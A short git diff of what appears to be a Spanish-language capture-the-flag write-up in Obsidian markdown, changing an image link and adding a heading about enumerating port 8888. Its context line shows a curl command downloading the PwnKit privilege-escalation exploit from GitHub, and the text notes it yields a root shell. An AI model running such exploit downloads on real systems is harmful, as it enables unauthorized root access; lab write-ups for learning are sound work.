@@ -309,5 +309,6 @@ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
 
 `ejecutamos el script`
 obtenemos una shell como root
-![[Pasted image 20240713185648.png]]
+![[Pasted image 20240713185808.png]]
 
+### solo nos falta enumerar el puerto 8888
